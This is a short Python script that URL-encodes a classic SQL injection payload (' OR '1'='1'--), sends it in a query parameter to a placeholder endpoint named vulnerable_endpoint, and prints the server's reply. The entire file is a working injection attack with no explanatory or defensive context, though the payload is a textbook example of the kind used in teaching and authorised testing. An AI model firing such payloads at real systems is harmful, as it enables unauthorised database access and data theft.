import requests

url = 'http://example.com/vulnerable_endpoint'

payload = "' OR '1'='1'--"

encoded_payload = requests.utils.quote(payload)

complete_url = f"{url}?param={encoded_payload}"

response = requests.get(complete_url)

print(response.text)
